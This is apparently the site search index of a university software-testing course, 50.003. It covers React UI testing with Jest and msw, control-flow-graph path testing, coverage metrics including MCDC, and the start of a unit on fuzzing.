{"config":{"lang":["en"],"separator":"[\\s\\-\\.\\_]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to 50.003","text":"<ul> <li>Course Handout.</li> <li>Course Schedule.</li> <li>Project Info.</li> </ul>"},{"location":"notes/l10_1_ui_test_annex/","title":"UI Testing Annex","text":""},{"location":"notes/l10_1_ui_test_annex/#to-use-msw-to-mock-api-call-in-jest-with-create-react-app","title":"To use msw to mock API call in Jest with create-react-app","text":"<ol> <li>run <code>npm i msw undici</code></li> <li>add the following to <code>package.json</code></li> </ol> <p><pre><code>  \"jest\": {\n    \"transformIgnorePatterns\": [\n      \"[/\\\\\\\\]node_modules[/\\\\\\\\].+[^esm]\\\\.(js|jsx|mjs|cjs|ts|tsx)$\",\n      \"^.+\\\\.module\\\\.(css|sass|scss)$\"\n    ]\n  }\n</code></pre> 3. add the following file <code>src/jest.polyfills.js</code></p> <p><pre><code>// jest.polyfills.js\n/**\n * @note The block below contains polyfills for Node.js globals\n * required for Jest to function when running JSDOM tests.\n * These HAVE to be require's and HAVE to be in this exact\n * order, since \"undici\" depends on the \"TextEncoder\" global API.\n *\n * Consider migrating to a more modern test runner if\n * you don't want to deal with this.\n */\n\nconst { TextDecoder, TextEncoder } = require('node:util')\nconst { ReadableStream } = require('node:stream/web')\nconst { clearImmediate } = require('node:timers') \nconst { performance } = require('node:perf_hooks')\n\nObject.defineProperties(globalThis, {\n  TextDecoder: { value: TextDecoder },\n  TextEncoder: { value: TextEncoder },\n  clearImmediate: { value: clearImmediate },\n  performance: { value: performance },\n  ReadableStream: { value: ReadableStream }\n})\n\nconst { Blob, File } = require('node:buffer')\nconst { fetch, Headers, FormData, Request, Response } = require('undici')\n\nObject.defineProperties(globalThis, {\n  fetch: { value: fetch, writable: true },\n  Blob: { value: Blob },\n  File: { value: File },\n  Headers: { value: Headers },\n  FormData: { value: FormData },\n  Request: { value: Request },\n  Response: { value: Response },\n})\n</code></pre> 4. add the following file <code>src/setupTests.js</code></p> <pre><code>import '@testing-library/jest-dom';\nimport \"./jest.polyfills\";\n</code></pre>"},{"location":"notes/l10_1_ui_testing/","title":"50.003 - UI Testing","text":""},{"location":"notes/l10_1_ui_testing/#learning-outcomes","title":"Learning Outcomes","text":"<ol> <li>Describe the objectives of GUI testing</li> <li>Describe different types of GUI testing</li> <li>Develop automated GUI unit testing</li> <li>Develop automated end-to-end testing</li> </ol> <p>The user interface is a software component that collects user input data, translates them into system expected input and present the results to the users. </p> <p>There are many forms of user interfaces, e.g. visual, auditory, haptic, multimodal, and etc. In this module we only focus on visual user interface. </p> <p>In modern computer system, we find many kinds of visual user interfaces.</p> <ol> <li>Command line </li> <li>Graphical user interface</li> <li>Chat bot</li> <li>...</li> </ol> <p>In this module, we put our attention to graphic user interface only.</p>"},{"location":"notes/l10_1_ui_testing/#objective-of-graphical-user-interface-testing","title":"Objective of Graphical User Interface Testing","text":"<p>There are two main objectives of conducting graphical user interface tests. </p> <ol> <li>To ensure functional correctness. </li> <li>To ensure visual correctness. </li> </ol> <p>Functional GUI Tests are developed and conducted to ensure that the GUI component is behaving according to the functional requirements. Visual GUI Tests is to ensure that the GUI component is displayed and rendered according to the visual effect (non-functional) requirements.</p>"},{"location":"notes/l10_1_ui_testing/#mode-of-ui-testing","title":"Mode of UI Testing","text":""},{"location":"notes/l10_1_ui_testing/#manual-testing","title":"Manual testing","text":"<p>Since UI is built for collecting input from human users, one way to test the UI components manually. Manual UI testing is labour intensive, as it requires enumerous amount of human resource and it is often mundane and repetitive. </p>"},{"location":"notes/l10_1_ui_testing/#automated-testing","title":"Automated testing","text":"<p>Thanks to modern frameworks, there are approaches that allow tester to capture the human tester's behavior as a script and automate the testing. </p>"},{"location":"notes/l10_1_ui_testing/#module-based-ui-testing","title":"Module Based UI Testing","text":"<p>Recall the earlier unit, testing is to find faults. It is often easier to find and isolate the fault if the software is developed in a modular way. </p>"},{"location":"notes/l10_1_ui_testing/#example-component-testing-reactjs-app-using-vitest","title":"Example - Component Testing React.js App using Vitest","text":"<p>At the point when this note was written, it is recoomended to use <code>vitest</code> (which is an inplace replacement of <code>jest</code>) as the primary test library for React projects initiated using <code>vite</code>. All the syntax and APIs offerred in <code>vitest</code> are back-ward compatible with <code>jest</code>. </p> <p>Let's recall our echo app example introduced in the earlier units. </p> <p></p> <p>The <code>Echo</code> Component consists of a <code>NewMessageBar</code> component and a <code>MessageList</code> component.</p> <p>Let's recall the <code>NewMessageBar</code> component, for the ease of testing, we move the following code  into a standalone file <code>NewMessageBar.jsx</code> in the <code>src/</code> folder.</p> <pre><code>function NewMessageBar({message, onMessageChange, onSubmitClick}) {\n    return (\n        &lt;div&gt;\n            &lt;input type=\"text\" aria-label=\"echo-message\" placeholder=\"\" \n                value={message} \n                onChange={(e) =&gt; {onMessageChange(e.target.value)}}&gt;\n            &lt;/input&gt;\n            &lt;button onClick={onSubmitClick}&gt; Submit &lt;/button&gt;\n        &lt;/div&gt;\n    )\n}\n</code></pre> <p>We consider the following unit test case in <code>Echo.test.jsx</code>. </p> <p><pre><code>test('Button is rendered in NewMessageBar', () =&gt; {\n    render(&lt;NewMessageBar /&gt;);\n    const button = screen.getByText(/submit/i);\n    expect(button).toBeInTheDocument();\n});\n</code></pre> The <code>render()</code> function takes a React Component and renders in the test environment. The <code>screen</code> object allows us to make reference to the screen rendered in the test environment.  The <code>getByText()</code> method takes a regex pattern which search for the text \"submit\" in upper or lower cases. The result is stored in the variable <code>button</code>. Finally we assert that the button can be found in the rendered document.  We argue that the above test case is leaning towards the visual test category. </p> <p>We recall another component used in the <code>Echo</code> app, <code>MessageList</code>. </p> <pre><code>function MessageList({messages}) {\n    let rows = [];\n    for (let i in messages) {\n        rows.push(\n            &lt;tr key={messages[i].time}\n                data-testid={messages[i].time}&gt;\n                &lt;td&gt;{messages[i].time}&lt;/td&gt;&lt;td&gt;{messages[i].msg}&lt;/td&gt;&lt;/tr&gt;\n        );\n    }\n    return (\n        &lt;table data-testid=\"message-list\"&gt;\n            &lt;tbody&gt;\n                &lt;tr&gt;&lt;th&gt;Date Time&lt;/th&gt;&lt;th&gt;Message&lt;/th&gt;&lt;/tr&gt;\n                {rows}\n            &lt;/tbody&gt;\n        &lt;/table&gt;\n    )\n}\n</code></pre> <p>For the ease of reference, we give some test ids to the data rows and the table.  We now can derive the following case.  <pre><code>test('No message is rendered in empty MessageList', () =&gt; {\n    const msgs = [];\n    render(&lt;MessageList messages={msgs} /&gt;);\n    const table = screen.getByTestId(\"message-list\");\n    expect(table).toBeInTheDocument(); // the table must be rendered.\n    expect(table.firstElementChild.children.length == 1); // only contains the header row.\n});\n</code></pre></p> <p>In the above test case, we render a <code>MessageList</code> component with an empty message list.  We expect the table's <code>tbody</code> element should contains only one row, which is the the header row.</p> <p>In the next test case, we instantiate a <code>MessageList</code> component with a singleton message list and expect that the  table should contains the message. <pre><code>test('A message is rendered in a singleton MessageList', () =&gt; {\n    const msgTxt = \"hello\";\n    const msgTime = (new Date()).toString();\n    const msg = { time : msgTime, msg: msgTxt };\n    const msgs = [msg];\n    render(&lt;MessageList \n            messages={msgs} /&gt;);\n    const table = screen.getByTestId(\"message-list\");\n    const row = screen.getByTestId(msgTime);\n    expect(table).toBeInTheDocument(); // the table must be rendered.\n    expect(row).toBeInTheDocument(); // the row must be rendered.\n    expect(table.contains(row));\n});\n</code></pre></p> <p>Note that both of the test cases are functional tests.</p> <p>Finally let's consider testing the <code>Echo</code> component. Recall that,</p> <pre><code>function Echo({http_addr}) {\n    const [msgTxt, setMsgTxt] = useState(\"\");\n    function handleSubmitClick() {\n        submitNewMessage();    \n    }\n    const [messages, setMessages] = useState([]);\n\n    async function submitNewMessage() {\n        const response = await fetch(`${http_addr}/echo/submit`,\n        {\n            method: 'POST',\n            body: `msg=${msgTxt}`,\n            headers: {\n                'Content-type': 'application/x-www-form-urlencoded'\n            }              \n        });\n        const text = await response.text();\n        const json = JSON.parse(text);\n        setMessages(json);\n    }\n\n\n    async function initMessages() {\n        const response = await fetch(`${http_addr}/echo/all`);\n        const text = await response.text();\n        const json = JSON.parse(text);\n        setMessages(json);\n    }\n\n    useEffect( () =&gt; {\n        initMessages();\n    }, []);\n\n    return (\n        &lt;div&gt;\n            &lt;NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/&gt;\n            &lt;MessageList messages={messages}/&gt;\n        &lt;/div&gt;\n    );\n}\n</code></pre> <p>In the above code snippet, we abstract the backend API URL via the <code>http_url</code> variable, for ease of mocking the API host.</p> <p>We define two test cases of the <code>Echo</code> component in the <code>Echo.test.jsx</code> test file as follows.</p> <pre><code>import { fireEvent, render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport {http, HttpResponse} from 'msw'; \nimport {setupServer} from 'msw/node';\nimport Echo from './Echo';\n\nconst server = setupServer(\n    http.get('/echo/all', () =&gt; {\n      return HttpResponse.json(\n        [{'msg':'hello','time':'2024-06-24T04:24:49.000Z'}])\n    }),\n    http.post('/echo/submit', () =&gt; {\n        return HttpResponse.json(\n          [{msg:'hello',time:'2024-06-24T04:24:49.000Z'},\n           {msg:'bye', time:'2024-06-25T00:12:30.000Z'}\n          ])\n      }),\n    )\n\nbeforeAll(() =&gt; server.listen())\nafterEach(() =&gt; server.resetHandlers())\nafterAll(() =&gt; server.close())\n\n\ndescribe(\"testing Echo component\", () =&gt; {\n    beforeAll(() =&gt; server.listen())\n    afterEach(() =&gt; server.resetHandlers())\n    afterAll(() =&gt; server.close())\n    // some tests here \n    test('testing initMessage() in Echo', async () =&gt; {\n        render(&lt;Echo http_addr='' /&gt;);\n        const msgTime = '2024-06-24T04:24:49.000Z';\n        const table = await screen.findByTestId(\"message-list\");\n        const row = await screen.findByTestId(msgTime);\n        expect(table).toBeInTheDocument(); // the table must be rendered.\n        expect(row).toBeInTheDocument(); // the row must be rendered.\n        expect(table.contains(row));\n    });\n\n    test('testing submitNewMessage() in Echo', async () =&gt; {\n        const msgTxt = \"bye\";\n        render(&lt;Echo http_addr='' /&gt;);\n        const textbox = screen.getByLabelText('echo-message');\n        const submitButton = screen.getByText(/submit/i);\n        fireEvent.change(textbox, {target: {value: msgTxt}});\n        userEvent.click(submitButton);\n        expect(textbox.value).toBe(msgTxt);\n        const msgTime = '2024-06-25T00:12:30.000Z';\n        const table = await screen.findByTestId(\"message-list\");\n        const row = await screen.findByTestId(msgTime);\n        expect(table).toBeInTheDocument(); // the table must be rendered.\n        expect(row).toBeInTheDocument(); // the row must be rendered.\n        expect(table.contains(row));\n    })\n})\n</code></pre> <p>As we want to isolate the test from the backend API, we need to mock the API calls. This is achieved by using the library <code>msw</code>. </p> <p>Due to some API deprecation, to import <code>msw</code> with versions of Jest and React we are currently using we need to introduce some extra configuration for Jest in <code>jest.polyfills</code>. For details setup, please refer to this file.</p> <p><code>setupServer()</code> functions allows us to define a mock backend API server with the required endpoints.  The first test case <code>'testing initMessage() in Echo'</code> is to test the first rendering of the <code>Echo()</code> component.  We want to ensure that the table contains a row with the message returned by the mocked API <code>/echo/all</code>. </p> <p>Note that <code>findByTestId()</code> is the async version of <code>getByTestId()</code>, it waits for the previous promise to be fully resolved before assigning the result to the LHS variable. </p> <p>The second test case <code>'testing submitNewMessage() in Echo'</code> is to test the user action of entering the message \"bye\" in the textbox and clicking the submit button. We want to assert that the table contains a row with the new message returned by the mocked API <code>/echo/submit</code>. </p>"},{"location":"notes/l10_1_ui_testing/#reference","title":"Reference","text":"<ul> <li><code>https://testing-library.com/docs/</code></li> <li><code>https://testing-library.com/docs/react-testing-library/example-intro</code></li> </ul>"},{"location":"notes/l10_1_ui_testing/#cohort-exercise-non-graded","title":"Cohort Exercise (Non graded)","text":"<p>Continue with your solution to Cohort Exercise 8 question 2, develop unit test cases for the React components found in the HR app.</p>"},{"location":"notes/l10_1_ui_testing/#ui-based-end-to-end-testing","title":"UI-based end-to-end testing","text":"<p>An end-to-end (E2E) testing is to assess the built system's feature from the user's perspective. All the components in the system  supporting that particular feature are actively tested, i.e. no mocking.  An end-to-end test case is often derived directly from a use case. </p> <p>To automate an end-to-end test, we can use test framework like Jest. For simple system feature like our Echo App. We could define our test as follows (similar to the <code>Echo.test.jsx</code> except that we don't require the mocking.)</p> <pre><code>function getRandomInt(max) {\n  return Math.floor(Math.random() * max);\n}\n\ntest('End-to-end testing on App', async () =&gt; {\n  const msgTxt = \"test message\" + getRandomInt(1000);\n  render(&lt;App /&gt;);\n  const textbox = screen.getByLabelText('echo-message');\n  const submitButton = screen.getByText(/submit/i); \n  fireEvent.change(textbox, {target: {value: msgTxt}});\n  await userEvent.click(submitButton);\n  expect(textbox.value).toBe(msgTxt);\n  await waitFor( () =&gt; {\n      const table = screen.getByTestId(\"message-list\");\n      fireEvent.change(textbox, {target: {value: ''}});\n      const text = screen.getByText(msgTxt);\n      expect(table).toBeInTheDocument(); // the table must be rendered.\n      expect(text).toBeInTheDocument(); // the text must be rendered.\n      expect(table.contains(text));\n  }); \n})\n</code></pre> <p>In the above test case, we use Jest to simulate the user's action sequence</p> <ol> <li>randomly generate a text message.</li> <li>click on the submit button.</li> <li>check that the message is stored by the system database and returned in the message list. </li> </ol> <p>For real world application, a use case is often much more sophiscated than the above example, and might  requiring more than a single UI. It is more effective to perform E2E testing using web browser simulation frameworks such as  Selenium, Puppeteer, Cypress and etc. </p> <p>You are strongly encouraged to explore and incoporate one of the following in your project. </p>"},{"location":"notes/l10_1_ui_testing/#references","title":"References","text":"<ul> <li>Selenium <code>https://www.youtube.com/watch?v=BQ-9e13kJ58</code> </li> <li>Cypress <code>https://www.youtube.com/watch?v=jX3v3N6oN5M</code></li> <li>Puppeteer <code>https://www.youtube.com/watch?v=GB4oJ1Ru1Nk</code></li> </ul>"},{"location":"notes/l10_2_whitebox_testing/","title":"50.003 - Code-based Testing : Path testing","text":""},{"location":"notes/l10_2_whitebox_testing/#learning-outcomes","title":"Learning Outcomes","text":"<ol> <li>Construct a control flow graph from a structured program</li> <li>Explain different types of test coverage metrics based on program graph</li> <li>Apply path testing techniques to generate test case to attain path coverage and MCDC coverage.</li> </ol>"},{"location":"notes/l10_2_whitebox_testing/#recall","title":"Recall","text":"<ul> <li> <p>Specification based testing</p> <ul> <li>Test cases are derived from the specification</li> <li>The goal is to ____</li> </ul> </li> <li> <p>Code-based testing</p> <ul> <li>Test cases are defined by making use of the knowledge of the internal structure and algorithm used in the test subject.</li> <li>The goal is to ____</li> </ul> </li> </ul>"},{"location":"notes/l10_2_whitebox_testing/#code-based-testing","title":"Code-based Testing","text":"<p>If there exists some bug in the program, it must be triggered by some sequence of statements from the program.</p> <p>In order to find faults, the tests must cover all possible sequences of statements. </p>"},{"location":"notes/l10_2_whitebox_testing/#programs-as-graphs","title":"Programs as Graphs","text":"<p>As a convention, we write \\(\\overline{S}\\) to denote a sequence of statement \\(S_1;...;S_n\\), \\(e\\) to denote an expression, i.e. \\(x &gt; 1\\), \\(isTrue\\), etc.</p> <p>Let \\(P\\) be a program, and \\(G\\) to be the control flow graph of \\(P\\), then</p> <ul> <li>Each statement \\(S\\) in \\(P\\) denotes a vertex \\(V\\) in \\(G\\), written, \\(S \\in P \\vdash V \\in G\\), sometimes we omit the \\(P\\) and \\(G\\) for simplicity.</li> <li>An edge \\((V_1,V_2)\\) exists in \\(G\\) iff \\(S_1;S_2\\) are two statements in sequence in \\(P\\) such that \\(S_1 \\vdash V_1\\) and \\(S_2 \\vdash V_2\\).</li> <li>Let \\({\\tt if}\\ e\\ \\{\\overline{S_1}\\} {\\tt else} \\{\\overline{S_2}\\} \\vdash V\\) then edges \\((V,V_1)\\) and \\((V, V_2)\\) exist in \\(G\\) iff <ul> <li>\\(S_1\\) is the first statement in \\(\\overline{S_1}\\) and \\(S_1 \\vdash V_1\\) and </li> <li>\\(S_2\\) is the first statement in \\(\\overline{S_2}\\) and \\(S_2 \\vdash V_2\\).</li> </ul> </li> <li>Let \\({\\tt if}\\ e\\ \\{\\overline{S_1}\\} {\\tt else} \\{\\overline{S_2}\\}; S'\\) in \\(P\\) and \\(S' \\vdash V'\\) then edges \\((V_1',V')\\) and \\((V_2',V')\\) exist in \\(G\\) iff <ul> <li>\\(S_1'\\) is the last statement in \\(\\overline{S_1}\\) and \\(S_1' \\vdash V_1'\\) and </li> <li>\\(S_2'\\) is the last statement in \\(\\overline{S_2}\\) and \\(S_2' \\vdash V_2'\\).</li> </ul> </li> <li>Let \\({\\tt while}\\ e\\ \\{\\overline{S_1}\\} \\vdash V\\). Then edges \\((V, V_1)\\) exist in \\(G\\) iff<ul> <li>\\(S_1\\) is the first stataement in \\(\\overline{S_1}\\) and \\(S_1 \\vdash V_1\\).</li> </ul> </li> <li>Let \\({\\tt while}\\ e\\ \\{\\overline{S_1}\\} \\vdash V\\). Then edges \\((V_1', V)\\) exist in \\(G\\) iff<ul> <li>\\(V_1'\\) is the last stataement in \\(\\overline{S_1}\\).</li> </ul> </li> </ul> <p>We can compile for loops to while loops before generating the control flow graph.</p> <p>For example, consider the following program</p> <pre><code>// example A\nfunction sum_all(arr) {\n  let sum = 0;\n  for (let i in arr) {\n    sum = arr[i] + sum;\n  }\n  return sum;\n}\n</code></pre> <p>will be compiled into</p> <pre><code>// example A\nfunction sum_all(arr) {\n  let sum = 0;\n  let i = 0;\n  while (i &lt; arr.length) {\n    sum = arr[i] + sum;\n    i++;\n  }\n  return sum;\n}\n</code></pre> <p>We can generate a control flow graph from <code>sum_all</code></p> <pre><code>graph\n  1--&gt;2\n  2--&gt;3\n  3--&gt;4\n  4--&gt;5\n  5--&gt;3\n  3--&gt;7</code></pre> <p>where the vertex IDs are the line number of the statement.</p>"},{"location":"notes/l10_2_whitebox_testing/#path","title":"Path","text":"<p>Given a graph \\(G\\), a path \\(p\\) is a sequence of vertices, \\(V_1,...,V_n\\) in \\(G\\) such that for all \\(i \\in [1,n-1]\\), \\((V_i, V_{i+1})\\) is an edge in \\(G\\).</p> <p>For example, in the above control flow graph, we have the following paths</p> <ul> <li>\\(1\\)</li> <li>\\(1,2,3\\)</li> <li>\\(1,2,3,7\\)</li> <li>\\(1,2,3,4,5,7\\)</li> <li>\\(2,3\\)</li> <li>...</li> </ul>"},{"location":"notes/l10_2_whitebox_testing/#test-coverage-metrics","title":"Test Coverage Metrics","text":""},{"location":"notes/l10_2_whitebox_testing/#program-graph-based-coverage","title":"Program Graph-based coverage","text":"<p>There are following different levels of test coverage metrics for program testing</p> <p>A set of tests constitute</p> <ol> <li>node coverage if all nodes in the control flow graph are visited when the tests are executed.</li> <li>edge coverage if all the edges in the control flow graph are viisted when the tests are executed.</li> <li>condition coverage if all conditional predicates are evaluated to both true and false. </li> <li>path coverage if all the paths in the control flow graph are visited when the tests are executed. </li> </ol> <p>Note that condition coverage often works better than edge coverage as it forces the tests to  exercise every single atomic predicates, i.e those are not formed by conjunction, disjunction and negation operator. Consider the following example </p> <p><pre><code>// example B\nfunction div_by_zero(x,y) {\n  if ((x==0) || (y&gt;0)) {\n    y = y/x;\n  } else {\n    x = y++;\n  }\n  return x + y;\n}\n</code></pre> Given the test cases</p> <ul> <li><code>x = 5, y = -5</code></li> <li><code>x = 7, y = 5</code></li> </ul> <p>covers all the edges, however it does not discover the division by zero bug.</p> <p>To trigger the bug, we would need to include the following test case</p> <ul> <li><code>x = 0, y = 1</code></li> </ul> <p>Which gives us condition coverage.</p> <p>Note that path coverage is impossible the achieved without approximation in the presence of loops. In practice we are required to traverse each loop with a fixed number of times, often 1. Then we apply graph condensation, in which the cycles in the control flow graph is replaced by a single node.</p> <p>For instance, in our running example, the result of the condensation processing is </p> <p><pre><code>graph\n  1--&gt;2\n  2--&gt;3'\n  3'--&gt;7</code></pre> in which the loop 3-4-5 is merged into a single node 3' by assuming the loop terminates after \\(X\\) of iterations.</p>"},{"location":"notes/l10_2_whitebox_testing/#condition-coverage-vs-path-coverage","title":"Condition coverage vs path coverage","text":"<p>Note that neither path coverage entails condition coverage nor vice versa.</p> <p>For example, </p> <pre><code>// example C\nif ((x&gt;0) || (x &lt;-1)) {\n  res = 1;\n} else {\n  res = 0;\n}\n</code></pre> <p>To obtain path coverage, we could have two tests, i.e. <code>x=1</code> and <code>x = 0</code>, which voilates condition coverage.</p> <p>On the other hand,</p> <p><pre><code>// example D\nif (x &amp;&amp; y) {\n  res = 1;\n} else {\n  res = 0;\n}\n</code></pre> Having {(<code>x = true, y = false</code>), (<code>x = false, y = true</code>)} we achieve condition coverage, but not path coverage nor edge coverage.</p> <p>Note that condition coverage and edge coverage do not imply path coverage, either.</p> <pre><code>// example E\nfunction f(x) {\n  if (x &gt; 1) {\n    y = 1;\n  } else {\n    y = 0;\n  }\n  if (x &gt; 0) {\n    z = 1;\n  } else {\n    z = 0;\n  }\n  return y * z;\n}\n</code></pre> <p>The test cases {(<code>x = 2</code>), (<code>x = -1</code>)} give us condition coverage and edge coverage. But we have not attained path coverage. e.g. we have not visited the path of taking the then-branch of the first if-statement followed by the else-branch of the second if-statement.</p>"},{"location":"notes/l10_2_whitebox_testing/#mcdc-coverage","title":"MCDC coverage","text":"<p>MCDC stands for Modified Condition Decision Coverage. </p> <p>MCDC requires </p> <ol> <li>Each statement must be executed at least once.</li> <li>Every program entry point and exit point must be invoked at least once.</li> <li>All possible outcomes of every control statement are taken at least once.</li> <li>Every nonconstant Boolean expression has been evaluated to both true and false outcomes. A boolean expression is constant iff it is a tautology, e.g. <code>a==a</code>, <code>a!=a</code> and <code>p &amp;&amp; !p</code></li> <li>Every nonconstant condition in a Boolean expression has been evaluated to both true and false outcomes.</li> <li>Every nonconstant condition in a Boolean expression has been shown to independently affect the outcomes (of the expression).</li> </ol> <p>Points 1 and 2 entail node coverage, 3 and 4 imply edge coverage. 5 implies condition coverage. 6 requires more explaination.  </p> <p>In the example D, to achieve MCDC coverage, we generate a decision table </p> cond 1 2 3 4 x T T F F y T F T F x &amp;&amp; y T F F F actions res = 0 X res = 1 X X X <p>In the above table, we conclude that if we fix <code>x</code> with one value, and toggle <code>y</code>'s value  we are able to obtain both actions. Similar observation applies when we fix <code>y</code> and toggle <code>x</code>. So we argue that we achieve MCDC coverage if we pick either </p> <ul> <li>{ (<code>x = true, y = true</code>), (<code>x = false, y = true</code>), (<code>x = true, y = false</code>) } or </li> <li>{ (<code>x = true, y = true</code>), (<code>x = false, y = true</code>), (<code>x = false, y = false</code>) } </li> </ul> <p>While for example C</p> cond 1 2 3 x&gt;0 T F F x&lt;-1 F T F x &gt;0 || x&lt;-1 T T F actions res = 1 X X res = 0 X <p>In the above table we realize that the two sub condition expresssions <code>x&gt;0</code> and <code>x&lt;-1</code> are dependent mutually, i.e. we can't hold <code>x&gt;0</code> to be <code>true</code> and toggle <code>x&lt;-1</code>.  In this example, we can still attain MCDC coverage by considering <code>{x=1, x =-2, x=0}</code>. If we adjust the example by replacing <code>x &gt;0 || x&lt;-1</code> with <code>x &gt;0 &amp;&amp; x &lt; -1</code>, there is no way we can attain MCDC coverage, because it is impossoble to find such a value of <code>x</code> to satisfy the condition.</p>"},{"location":"notes/l10_2_whitebox_testing/#coverage-report-in-jest","title":"Coverage Report in Jest","text":"<p>In Jest, we can enable to coverage report by adding the following to the <code>package.json</code>, assuming Jest has been enabled and installed.</p> <pre><code>  \"jest\": {\n    \"collectCoverage\": true\n    ,\"coverageReporters\": [\"text\", \"html\"]\n  },\n</code></pre> <p>Assuming we have the <code>sum_all.js</code> file with code describe in the example A and the corresponding test code as follows,</p> <pre><code>// test/sum_all.test.js\nconst sum_all = require('../src/sum_all');\ndescribe(\"test suite for sum_all\", () =&gt; {\n    test (\"test 1 for sum_all\", () =&gt; {\n        const expected = 55;\n        expect(sum_all([1,2,3,4,5,6,7,8,9,10])).toBe(expected);\n    })\n})\n</code></pre> <p>when we run <code>npm run test sum_all.test.js</code>, we see the following additional output</p> <pre><code> PASS  test/sum_all.test.js\n  test suite for sum_all\n    \u2713 test 1 for sum_all (3 ms)\n\n------------|---------|----------|---------|---------|-------------------\nFile        | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s \n------------|---------|----------|---------|---------|-------------------\nAll files   |     100 |      100 |     100 |     100 |                   \n sum_all.js |     100 |      100 |     100 |     100 |                   \n------------|---------|----------|---------|---------|-------------------\n</code></pre> <p>We may also refer to the <code>.html</code> report generated in the <code>coverage</code> folder.</p> <p>Unfortunately, we don't get condition coverage from <code>jest</code> builtin coverage analyzer. Consider the <code>div_by_zero</code> test. Given the <code>div_by_zero</code> function in example B and the test code as follows <pre><code>// test/div_by_zero.test.js\nconst f = require('../src/div_by_zero');\n\ndescribe(\"test suite for div_by_zero\", () =&gt; {\n    test (\"test 1 for f\", () =&gt; {\n        const expected = -9;\n        expect(f(5,-5)).toBe(expected);\n    })\n    test (\"test 2 for f\", () =&gt; {\n        const expected = 7.714285714285714;\n        expect(f(7,5)).toBeCloseTo(expected,5);\n    })\n})\n</code></pre> running <code>npm run test div_by_zero.test.js</code> we find</p> <pre><code>----------------|---------|----------|---------|---------|-------------------\nFile            | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s \n----------------|---------|----------|---------|---------|-------------------\nAll files       |     100 |      100 |     100 |     100 |                   \n div_by_zero.js |     100 |      100 |     100 |     100 |                   \n----------------|---------|----------|---------|---------|-------------------\n</code></pre>"},{"location":"notes/l10_2_whitebox_testing/#path-testing","title":"Path Testing","text":"<p>To conduct path testing, a general approach is </p> <ul> <li>to generate enough test cases cover all paths with condensation (if possible).</li> <li>in case of complex condition expression (esp with dependent condition expressions), we should construct a decision table to check impossibilities and generate additional test cases to ensure condition coverage.</li> </ul> <p>In regard to the path generation, we first need to find out how many unique paths exist. Recall notion of cyclomatic complexity from graph theory class, that defines the number of linearly independent paths from the entry to the exit node.</p> <p>$$ V(G) = e - n + 2p $$ where \\(e\\) is the number of edges in \\(G\\) and \\(n\\) is the number of nodes in \\(G\\) and \\(p\\) denotes the number of connected components. Since we are dealing with one program at a time, the number of connected compoment is 1. (Note \\(p\\) is not strongly connected component.)</p> <p>By applying the above formula to  the control flow graph from the <code>max_all</code> function, we find that in total there are 6 - 6 + 2 * 1 = 2 linearly unique paths from the entry to the exit, namely</p> <ul> <li>\\(1,2,3,7\\)</li> <li>\\(1,2,3,4,5,7\\)</li> </ul> <p>We generate the test cases as follows,</p> id arr expected output 1 [] 0 2 [1,2,3,4,5,6,7,8,9,10] 55 <p>Note that Cyclomatic Complexity only measures the number of uniquely linearly paths, which serves as the lower-bound of the path coverage. For instance, recall example E, the cyclomatic complexity of function <code>f</code> is 8-7+2*1 = 3. But there exist 4 executable paths. This is because when counting linearly paths, the first if-else gives us two paths, by including a second if-else adds an extra 1 uniquely linearly path (as alternative). To find all executale paths (with max 1-loop-unrolling), we need to rely on the condition coverage.</p> <p>Now we have to verify whether we have attained MCDC for <code>max_all</code>. Since there is only one predicate <code>i &lt; arr.length</code> we have already covered both possible outcome of the predicate, namely, we executed the body the loop as well as exit from the loop. Hence we argue that the above test cases is providing path and MCDC coverage.</p>"},{"location":"notes/l10_2_whitebox_testing/#cohort-exercise-graded","title":"Cohort Exercise (Graded)","text":"<p>Let's consider another example </p> <pre><code>function gcd(x,y) {\n  let r = null;\n  if ((x &lt; 1) || (y &lt; 1)) {\n    r = null;\n  } else {\n    while (x != y) {\n      if (x &gt; y) {\n        let t = x - y;\n        x = y;\n        y = t\n      } else {\n        let t = y - x;\n        y = x;\n        x = t;\n      }\n    }\n    r = x;\n  }\n  return r;\n}\n</code></pre> <ol> <li>construct CFG of the above program.</li> <li>find the cyclomatic complexity of the CFG.</li> <li>generate the test cases to cover all paths.</li> <li>generate extra test cases (if needed) to attain MCDC coverage.</li> <li>verify your test cases's coverage using jest (though it is only up to edge coverage)</li> </ol>"},{"location":"notes/l11_1_auto_test_generation/","title":"50.003 - Auto Test Generation","text":""},{"location":"notes/l11_1_auto_test_generation/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit you should be able to</p> <ol> <li>explain the roles and functionalities of the test generator.</li> <li>apply mutation-based fuzzing to generate test cases.</li> <li>apply generation-based function to synthesize test cases.</li> </ol>"},{"location":"notes/l11_1_auto_test_generation/#test-generation","title":"Test Generation","text":"<p>Recall that process of software testing.</p> <pre><code>graph\n  Input--&gt;Program\n  Program--&gt;TO\n  TO[\"Test Oracle\"]--&gt;Pass\n  TO[\"Test Oracle\"]--&gt;Fail</code></pre> <p>So far we have been defining, curating and generating test cases manually.</p> <p>In this unit we consider some approaches that generates test cases automatically. </p> <pre><code>graph\n  TG[\"Test Generator\"]--&gt;Input\n  Input--&gt;Program\n  Program--&gt;TO\n  TO[\"Test Oracle\"]--&gt;Pass\n  TO[\"Test Oracle\"]--&gt;Fail</code></pre>"},{"location":"notes/l11_1_auto_test_generation/#fuzz-testing","title":"Fuzz Testing","text":"<p>Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. </p> <p>Fuzzing aims to identify test inputs which reveal exploitable vulnerabilities.</p> <p>One downside for fuzzing is that it can't generate the expected outputs. This drawback is minor since for most of the fuzzing test cases, error should be expected outputs. </p>"},{"location":"notes/l11_1_auto_test_generation/#why-fuzzing","title":"Why fuzzing","text":"<p>Besides test case generation automation, there are several extra reasons why fuzzing should be considered.</p> <ul> <li>A study found that one-quarter to one-third of all utilities on every UNIX system that the evaluators could get their hands on would crash in the presence of random input.</li> <li>A study that looked at 30 different Windows applications found that 21% of programs crashed and 24% hung when sent random mouse and keyboard input, and every single application crashed or hung when sent random Windows event messages.</li> <li>A study found that OS X applications, including Acrobat Reader, Apple Mail, Firefox, iChat, iTunes, MS Office, Opera, and Xcode, were even worse than the Windows ones.</li> 